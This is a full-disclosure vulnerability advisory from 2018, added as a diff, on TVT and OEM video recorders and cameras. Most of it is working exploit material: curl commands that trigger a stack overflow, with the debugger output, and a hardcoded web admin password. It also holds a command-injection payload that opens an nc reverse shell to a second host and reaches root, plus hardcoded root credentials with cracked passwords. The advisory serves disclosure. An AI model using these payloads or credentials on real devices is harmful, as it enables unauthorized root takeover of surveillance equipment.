@@ -1,0 +1,237 @@
+[STX]
+
+Subject: Shenzhen TVT Digital Technology Co. Ltd & OEM {DVR/NVR/IPC} API RCE
+
+Attack vector: Remote
+Authentication: Anonymous (no credentials needed)
+Researcher: bashis <mcw noemail eu> (December 2017)
+PoC: https://github.com/mcw0/PoC
+Python PoC: https://github.com/mcw0/PoC/blob/master/TVT-PoC.py
+Release date: April 9, 2018
+Full Disclosure: 90 days
+
+Vulnerable: To many OEM vendors,products and versions to specify.
+Non Vulnerable: Firmware released from March 2018 from TVT and their OEM's
+Vendor Advisory: http://en.tvt.net.cn/news/227.html
+
+Source Vendor: Shenzhen TVT Digital Technology Co. Ltd (http://en.tvt.net.cn/)
+OEM Vendors (+80): https://ipvm.com/forums/video-surveillance/topics/a-list-of-tvt-s-79-dvr-oems (Not complete list)
+
+-[Summary]-
+1. Stack Overflow in Base64 Authorization Mechanism
+2. Hardcoded Authentication Mechanism on TCP/4567
+3. Hardcoded Authentication Mechanism on TCP/4567 w/ RCE (PoC: Reverse Shell)
+4. Hardcoded 'admin' Web GUI Password
+5. Hardcoded 'admin' Web GUI Password w/ RCE (PoC: Reverse Shell)
+6. Hardcoded root credentials w/ telnetd
+
+-[Timeline]-
+December 26, 2017: Talks with SecuriTeam Secure Disclosure (SSD) regarding these specific issues
+December 28, 2017: Tried to establish contact with TVT <overseas@tvt.net.cn>, no reply.
+January 9, 2018: Handed over all details for free to SecuriTeam Secure Disclosure (SSD) and agreed 90 days until FD.
+January 11, 2018: SSD replied back that they had established contact with TVT, and provided my details.
+February 13, 2018: Pinged SSD for update - no reply.
+February 19, 2018: Understood that main PoC at SSD no longer working for SSD.
+February 19, 2018: Noticed that some OEM released updated firmware; Stack Overflow not fixed. Updated SSD with findings.
+April 9, 2018: Full Disclosure
+
+
+1)
+-[Stack Overflow in Base64 Authorization]-
+
+BBBBCCCCDDDDEEEE => {R4-R6,PC} 
+heap: NX + Non ASLR
+stack: NX + ASLR
+Badbytes: None, since the Authorization request with stack overflow is base64 encoded
+Vulnerable binary: /mnt/mtd/ConfigSyncProc (HTTP wrapper from TCP/80 to TCP/4567)
+
+1.1
+curl -v http://192.168.57.20:80/doLogin -X POST -d '<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>' --user admin:`for((i=0;i<506;i++)); do echo -en "A";done`BBBBCCCCDDDDEEEE
+
+1.2 (Additional way with the updated February Firmware)
+curl -v http://192.168.57.20:80/doLogin -X POST -d '<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>' --cookie "auInfo=$(echo -en "admin:`for((i=0;i<506;i++)); do echo -en "A";done`BBBBCCCCDDDDEEEE"|base64);"
+
+Thread 12 "CAPIConfigServe" received signal SIGSEGV, Segmentation fault.
+[Switching to LWP 1522]
+0x45454544 in ?? ()
+(gdb) bt
+#0  0x45454544 in ?? ()
+#1  0x76fe4404 in _dl_internal_error_number () from /lib/ld-uClibc.so.0
+Backtrace stopped: previous frame identical to this frame (corrupt stack?)
+(gdb) i reg
+r0             0x20000024   536870948
+r1             0x1  1
+r2             0xfb0ab160   4211781984
+r3             0xfb0ab160   4211781984
+r4             0x42424242   1111638594
+r5             0x43434343   1128481603
+r6             0x44444444   1145324612
+r7             0x31e84c 3270732
+r8             0x71bfdd28   1908399400
+r9             0x2e2fe4 3026916
+r10            0x2c33e0 2896864
+r11            0x71bfe014   1908400148
+r12            0x0  0
+sp             0x71bfdb48   0x71bfdb48
+lr             0x76fe4404   1996375044
+pc             0x45454544   0x45454544
+cpsr           0x60000030   1610612784
+(gdb)
+
+Note:
+NVMS1000 for Microsoft Windows also vulnerable for stack overflow (Verified: Ver3.4.0.61217_EN)
+(Nothing I've spent time with)
+
+
+2)
+-[Hardcoded Authentication Mechanism]-
+
+Hardcoded authentication to download remote system configuration - including login and password in clear text.
+Problem: 'NVMS9000' process listen on all available interfaces, and not only on loopback/127.0.0.1. (Debug/develop or on purpose?)
+
+Simple Illustration:
+Legit HTTP <-> [<--TCP/80--> ConfigSyncProc <--TCP/4567-X-> NVMS9000]
+                                                         |
+Attacker <---------TCP/4567------------------------------^
+
+Note:
+By using this, you will disconnect the legit device 'ConfigSyncProc' process from the 'NVMS9000' process and it will be disconnected until reboot.
+However,
+this can be used to 'takeover' the remote 'NVMS9000' Web communication, as you can launch another 'ConfigSyncProc' process from anywhere in the world,
+and act as the frontend for remote backend NVMS9000 process in other device by using: '/mnt/mtd/ConfigSyncProc /mnt/mtd/Web/ <Remote IP Address> 4567 80 &'.
+
+PoC:
+
+[Connect to server on TCP/4567]
+
+[TxD from attacker]
+{D79E94C5-70F0-46BD-965B-E17497CCB598}
+
+[RxD from Server]
+{D79E94C5-70F0-46BD-965B-E17497CCB598}
+
+[TxD from attacker]
+GET /requestSystemConfig HTTP/1.1
+Authorization: Basic
+Content-type: text/xml
+Content-Length:0
+{D79E94C5-70F0-46BD-965B-E17497CCB598} 1
+
+[RxD from server]
+HTTP/1.1 200 OK
+Content-type: text/html
+Content-Length: 67124
+Connection: close
+AuthInfo:
+{D79E94C5-70F0-46BD-965B-E17497CCB598} 1
+
+DAAAACEAAAA[...Base64 encoded data]
+
+echo -en "DAAAACEAAAA[...Base64 encoded data]" | base64 -d | hexdump -C
+[...]
+000078b0  00 00 00 00 00 00 00 00  61 64 6d 69 6e 00 00 00  |........admin...|
+000078c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+000078f0  00 00 00 00 00 00 00 00  31 32 33 34 35 36 00 00  |........123456..|
+00007900  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+[...]
+
+3)
+-[Hardcoded Authentication Mechanism on TCP/4567 w/ RCE]-
+
+With special crafted base64 encoded XML packets with 32 bytes binary header on TCP/4567, allows execute of unauthenticated RCE.
+
+PoC here: https://github.com/mcw0/PoC/blob/master/TVT-PoC.py
+(Little more complicated than to be one-liner PoC)
+
+4)
+-[Hardcoded 'admin' Web GUI Password]-
+Login: Can be 'admin', 'root', depending on which OEM (usually 'admin')
+Hardcoded password: {12213BD1-69C7-4862-843D-260500D1DA40}
+
+PoC:
+$ curl -v http://192.168.57.20:80/doLogin -X POST -d '<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>' --user "admin:{12213BD1-69C7-4862-843D-260500D1DA40}"
+
+* Hostname was NOT found in DNS cache
+*   Trying 192.168.57.20...
+* Connected to 192.168.57.20 (192.168.57.20) port 80 (#0)
+* Server auth using Basic with user 'admin'
+> POST /doLogin HTTP/1.1
+> Authorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=
+> User-Agent: curl/7.38.0
+> Host: 192.168.57.20
+> Accept: */*
+> Content-Length: 103
+> Content-Type: application/x-www-form-urlencoded
+>
+* upload completely sent off: 103 out of 103 bytes
+< HTTP/1.1 200 OK
+< Content-type: text/xml
+< Content-Length: 773
+< Connection: close
+< AuthInfo:
+<
+<?xml version="1.0" encoding="UTF-8"?>
+<response version="1.0">	<status>success</status>
+	<content>		<userId>{9FC4C546-402B-9C48-9DCB-508290053027}</userId>
+		<authEffective>false</authEffective>
+		<authGroupId></authGroupId>
+		<adminName>admin</adminName>
+		<resetPassword><![CDATA[MTIzNDU2]]></resetPassword>
+		<systemAuth>			<localChlMgr>true</localChlMgr>
+			<remoteChlMgr>true</remoteChlMgr>
+			<diskMgr>true</diskMgr>
+			<talk>true</talk>
+			<alarmMgr>true</alarmMgr>
+			<net>true</net>
+			<rec>true</rec>
+			<remoteLogin>true</remoteLogin>
+			<scheduleMgr>true</scheduleMgr>
+			<localSysCfgAndMaintain>true</localSysCfgAndMaintain>
+			<remoteSysCfgAndMaintain>true</remoteSysCfgAndMaintain>
+			<securityMgr>true</securityMgr>
+		</systemAuth>
+	</content>
+</response>
+* Closing connection 0
+
+
+5)
+-[Hardcoded 'admin' Web GUI Password w/ RCE]-
+
+Well, it's authenticated, but with the combination of hardcoded password above - it can be considered as 'Anonymous' RCE.
+
+[Add and enable] (forking reverse shell)
+curl -v --user admin:{12213BD1-69C7-4862-843D-260500D1DA40} -X POST http://192.168.57.20:80/editBlackAndWhiteList -d '<?xml version="1.0" encoding="utf-8"?><request version="1.0" systemType="NVMS-9000" clientType="WEB"><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type="filterTypeMode">refuse</filterType><filterList type="list"><itemType><addressType type="addressType"/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(nc${IFS}192.168.57.1${IFS}31337${IFS}-e${IFS}/bin/sh${IFS}&)</ip></item></filterList></content></request>'
+
+[Delete and Disable]
+curl -v --user admin:{12213BD1-69C7-4862-843D-260500D1DA40} -X POST http://192.168.57.20:80/editBlackAndWhiteList -d '<?xml version="1.0" encoding="utf-8"?><request version="1.0" systemType="NVMS-9000" clientType="WEB"><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>false</switch><filterType type="filterTypeMode">refuse</filterType><filterList type="list"><itemType><addressType type="addressType"/></itemType></filterList></content></request>'
+
+[listener]
+$ ncat -vlp 31337
+Ncat: Version 7.60 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 033F 60E5 8A92 703A BF58 A8AB E0BE 4480 8C9D 703E
+Ncat: Listening on :::31337
+Ncat: Listening on 0.0.0.0:31337
+Ncat: Connection from 192.168.57.20.
+Ncat: Connection from 192.168.57.20:53974.
+
+id
+uid=0(root) gid=0(root)
+
+pwd
+/mnt/mtd
+
+whoami
+root
+exit
+$
+
+6)
+-[Hardcoded root credentials w/ telnetd]-
+
+china123         (root) (root:tsfhKsZ1p7nE2:15506:0:99999:7:::)
+1001chin         (root) (root:3kzd9/xqjB.3k:16772:0:99999:7:::)
+
+[ETX]
